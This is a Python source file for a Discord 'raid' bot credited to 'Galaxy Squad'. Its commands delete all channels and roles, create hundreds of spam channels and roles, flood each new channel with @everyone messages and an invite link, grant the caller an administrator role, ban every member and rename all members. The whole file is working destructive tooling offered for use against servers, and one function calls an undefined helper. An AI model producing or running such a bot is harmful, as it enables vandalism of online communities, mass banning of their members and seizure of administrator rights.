import discord
from discord.ext import commands
from discord.ext.commands import bot
import colorama
from colorama import Fore

colors = {"main": Fore.CYAN,
          "white": Fore.WHITE,
          "red": Fore.RED}
msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
        "+": f"{colors['white']}[{colors['main']}+{colors['white']}]",
        "error": f"{colors['white']}[{colors['red']}e{colors['white']}]",
        "input": f"{colors['red']}{colors['main']}>>{colors['red']}",
        "pressenter": f"{colors['red']}[{colors['main']}i{colors['red']}] Press ENTER to exit"}
        
intents = discord.Intents.default()
intents.members=True
client = discord.Client()
bot = commands.Bot(command_prefix = ">", intents=intents)
bot.remove_command("help")

@bot.event
async def on_ready():
 await bot.change_presence(status=discord.Status.dnd, activity=discord.Game('Prefix = >'))    
 print('''
_____ _                  
| __ \ | |                 
| | \/ __ _| | __ ___ ___ _
| | __ / _` | |/ _` \ \/ / | | |
| |_\ \ (_| | | (_| |> <| |_| |
 \____/\__,_|_|\__,_/_/\_\\__, |
                           __/ |
                          |__
#galaxy squad

>bot creado por hades
>Gracias por usar mi codigo
comandos :    
                         >raid    
                         >mr(roles masivos)
                         >dr(eliminar roles)    
                         >admin
                         >banall            
                         >nc
prefix: >  
  
                                 by hades''')

@bot.event
async def on_guild_channel_create(channel):
 for i in range(0,25):
  await channel.send('''@everyone servidor eliminado por orden de galaxy SQ 
https://discord.gg/dak3RwqDfj
https://media.discordapp.net/attachments/964444776671870996/973434490733092964/20220509_044512.gif''')

@bot.command()
async def raid(ctx):
 nombre = "RAID BY Galaxy"
 await ctx.message.delete()
 await ctx.guild.edit(name = '#GalaxySQ')
 for channel in ctx.guild.channels:
  try:
   await channel.delete()
  except:
   pass
 for i in range(0, 220):
       await ctx.guild.create_text_channel(nombre)
       print("raid iniciado")
 
@bot.command(name="mr")
async def RolMasivo(ctx, amount: int = 250, *, name="RaidBygalaxy💀"):
    await ctx.message.delete()
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=name)
            print(f"{msgs['+']} rol creado")
        except:
            print(f"{msgs['error']} no se pudo crear el rol")               
       
@bot.command(name='dr')
async def EliminarRoles(ctx):
    await ctx.message.delete()
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} rol eliminado: {r}")
        except:
            print(f"{msgs['error']} no se pudo eliminar el rol: {r}")

@bot.command(name="admin")
async def Admins(ctx, *, rolename="GalaxySquad"):
    await ctx.message.delete()
    try:
        perms = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=rolename, permissions=perms)
        await ctx.message.author.add_roles(role)
        print(f"{msgs['+']} se le dio admin a {ctx.message.author}")
    except:
    	pass

@bot.command()
async def banall(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
            try:
                await m.ban()
                print(f"{msgs['+']} member baneado: {m}")
            except:
            	pass
            
@bot.command()
async def nc(ctx, *, name="GalaxyOnTop"):
    await ctx.message.delete()
    for m in ctx.guild.members:
            try:
                await m.edit(nick=name)
                print(f"{msgs['+']} nick puesto a  {m}'s ")
            except:
            	pass

@bot.command()
async def help(ctx):
        author = ctx.author
        embedVar = discord.Embed(title="comandos", color=0xff0000)
        embedVar.add_field(name="Raid", value= '''``` 
         raid
         mr(roles masivos)
         dr(eliminar roles)
         admin(te da administrador)
         banall
         >nc(cambia el nombre de todos)
         ```''', inline = False)
        embedVar.set_image(url="https://media.discordapp.net/attachments/964444776671870996/973434490733092964/20220509_044512.gif ")
        embedVar.set_footer(text=f"#GalaxySQ")
        await ctx.send(embed=embedVar)

token = "token del bot"                   
bot.run(token)